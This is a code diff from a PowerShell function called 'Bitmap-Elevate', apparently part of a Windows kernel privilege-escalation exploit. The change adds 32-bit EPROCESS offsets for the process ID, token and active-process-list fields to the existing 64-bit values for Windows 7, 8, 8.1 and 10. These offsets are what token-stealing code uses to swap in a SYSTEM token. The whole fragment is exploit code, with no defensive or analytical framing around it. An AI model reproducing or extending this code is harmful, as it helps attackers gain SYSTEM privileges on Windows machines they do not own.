@@ -74,30 +74,54 @@ function Bitmap-Elevate {
 	{
 		'10.0' # Win10 / 2k16
 		{
-			$UniqueProcessIdOffset = 0x2e8
-			$TokenOffset = 0x358          
-			$ActiveProcessLinks = 0x2f0
+			if(!$x32Architecture){
+				$UniqueProcessIdOffset = 0x2e8
+				$TokenOffset = 0x358          
+				$ActiveProcessLinks = 0x2f0
+			} else {
+				$UniqueProcessIdOffset = 0xb4
+				$TokenOffset = 0xf4          
+				$ActiveProcessLinks = 0xb8
+			}
 		}
-	
+		
 		'6.3' # Win8.1 / 2k12R2
 		{
-			$UniqueProcessIdOffset = 0x2e0
-			$TokenOffset = 0x348          
-			$ActiveProcessLinks = 0x2e8
+			if(!$x32Architecture){
+				$UniqueProcessIdOffset = 0x2e0
+				$TokenOffset = 0x348          
+				$ActiveProcessLinks = 0x2e8
+			} else {
+				$UniqueProcessIdOffset = 0xb4
+				$TokenOffset = 0xec          
+				$ActiveProcessLinks = 0xb8
+			}
 		}
-	
+		
 		'6.2' # Win8 / 2k12
 		{
-			$UniqueProcessIdOffset = 0x2e0
-			$TokenOffset = 0x348          
-			$ActiveProcessLinks = 0x2e8
+			if(!$x32Architecture){
+				$UniqueProcessIdOffset = 0x2e0
+				$TokenOffset = 0x348          
+				$ActiveProcessLinks = 0x2e8
+			} else {
+				$UniqueProcessIdOffset = 0xb4
+				$TokenOffset = 0xec          
+				$ActiveProcessLinks = 0xb8
+			}
 		}
-	
+		
 		'6.1' # Win7 / 2k8R2
 		{
-			$UniqueProcessIdOffset = 0x180
-			$TokenOffset = 0x208          
-			$ActiveProcessLinks = 0x188
+			if(!$x32Architecture){
+				$UniqueProcessIdOffset = 0x180
+				$TokenOffset = 0x208          
+				$ActiveProcessLinks = 0x188
+			} else {
+				$UniqueProcessIdOffset = 0xb4
+				$TokenOffset = 0xf8          
+				$ActiveProcessLinks = 0xb8
+			}
 		}
 	}
 	
